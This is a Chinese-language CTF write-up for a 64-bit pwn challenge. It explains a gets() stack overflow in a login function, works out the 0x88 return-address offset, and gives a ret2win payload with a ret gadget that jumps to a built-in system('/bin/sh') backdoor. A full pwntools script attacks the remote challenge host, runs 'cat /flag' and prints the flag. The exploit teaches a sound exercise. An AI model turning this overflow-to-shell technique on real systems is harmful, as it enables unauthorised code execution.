# vuln WP

## 题目信息

- 目标地址：`120.27.146.76:27861`
- 附件：`./vuln/vuln`
- 最终拿到的远程 flag：`flag{9ab58b2ed58ae1f678da4aa605f38ce0}`

## 题目分析

先对附件做基本检查：

- `64-bit ELF`
- `No PIE`
- `No canary`
- `Partial RELRO`
- 栈可执行

这类配置下如果存在明显栈溢出，通常都比较好利用。

### 1. 关键函数

程序里有一个非常醒目的后门函数：

```c
void backdoor() {
    system("/bin/sh");
}
```

对应地址是：

```text
backdoor = 0x4011f6
"/bin/sh" = 0x402008
```

也就是说，只要办法把程序执行流劫持到 `backdoor()`，就能直接起 shell。

### 2. 登录逻辑

根据反汇编可以还原出核心逻辑：

```c
void login() {
    char password[0x40];
    char username[0x40];

    puts("=== Welcome to SecureAuth System ===");
    printf("Username: ");
    read(0, username, 0x40);
    printf("Password: ");
    gets(password);

    if (!strcmp(username, "admin")) {
        puts("Access Denied: Admin login is disabled.");
    } else {
        puts("Invalid credentials.");
    }
}
```

这里的漏洞点非常直接：

- `username` 用 `read(0, username, 0x40)` 读取，长度刚好，不溢出
- `password` 用 `gets(password)` 读取，没有长度限制
- `password` 缓冲区只有 `0x40` 字节，明显存在栈溢出

### 3. 栈布局与偏移

从汇编能看出 `login()` 在栈上分配了 `0x80` 字节：

```text
rbp-0x80 ~ rbp-0x41 : password[0x40]
rbp-0x40 ~ rbp-0x01 : username[0x40]
rbp+0x00            : saved rbp
rbp+0x08            : return address
```

因此从 `password` 起始位置覆盖到返回地址的偏移是：

```text
0x40 + 0x40 + 0x8 = 0x88
```

也就是：

```python
offset = 0x88
```

这里有一个容易误判的小点：

- `gets(password)` 溢出时会顺带覆盖上面的 `username`
- 所以后面 `strcmp(username, "admin")` 大概率会失败，程序输出 `Invalid credentials.`
- 但这不影响利用，因为无论哪条分支，`login()` 最后都会 `ret`

只要返回地址被我们覆盖，照样可以跳进 `backdoor()`。

## 利用思路

利用链非常短：

1. 正常输入任意用户名
2. 在密码处输入溢出 payload
3. 覆盖 `login()` 返回地址到 `backdoor()`
4. 获得 `/bin/sh`
5. 执行 `cat /flag`

### 为什么要补一个 `ret`

64 位程序里经常需要考虑栈对齐问题。实战里直接跳 `backdoor()` 不一定稳定，补一个单独的 `ret` 会更稳。

我这里使用的 gadget：

```text
ret = 0x401374
backdoor = 0x4011f6
```

最终 payload：

```python
payload = b"A" * 0x88 + p64(0x401374) + p64(0x4011f6)
```

## 远程利用过程

这里还有一个远程交互细节需要注意：

- 不要把 `cat /flag` 和溢出 payload 一起提前发过去
- 更稳妥的做法是先触发溢出拿到 shell，再单独发送命令

原因是程序把 `read()` 和 `gets()` 混着用，如果命令发得太快，额外输入可能不会如预期进入后续的 `/bin/sh`。

## 复现脚本

下面是我打远程时使用的 `pwntools` 脚本：

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "120.27.146.76"
PORT = 27861

ret = 0x401374
backdoor = 0x4011f6
payload = b"A" * 0x88 + p64(ret) + p64(backdoor)

io = remote(HOST, PORT)
io.recvuntil(b"Username: ")
io.sendline(b"user")
io.recvuntil(b"Password: ")
io.sendline(payload)

# 等 shell 起好后再发命令，避免输入被前面的 stdio 处理掉
sleep(0.3)
io.sendline(b"cat /flag")

io.interactive()
```

运行后可以直接读到：

```text
flag{9ab58b2ed58ae1f678da4aa605f38ce0}
```

## 总结

本题是非常典型的栈溢出基础题，核心点只有两个：

- `gets()` 导致密码缓冲区可无限写入
- 程序内自带 `backdoor()`，直接 `system("/bin/sh")`

由于：

- 没有 canary
- 没有 PIE
- 后门函数现成可用

所以利用方式就是最直接的 ret2win。

最终 flag：

```text
flag{9ab58b2ed58ae1f678da4aa605f38ce0}
```
